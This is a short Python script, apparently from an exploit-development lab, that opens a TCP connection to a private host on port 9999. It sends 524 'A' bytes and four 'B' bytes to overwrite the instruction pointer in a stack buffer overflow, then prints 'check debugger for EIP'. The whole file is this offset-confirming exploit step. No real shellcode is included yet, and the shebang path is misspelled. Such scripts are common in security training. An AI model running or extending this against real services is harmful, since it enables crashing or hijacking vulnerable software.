#!/user/bin/python3
import socket

host = "10.0.2.4"
defaultPort = 9999

shellcode = "A" * 524 + "B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, defaultPort))
    s.send(shellcode.encode())
except:
    print("check debugger for EIP")
finally:
    s.close()
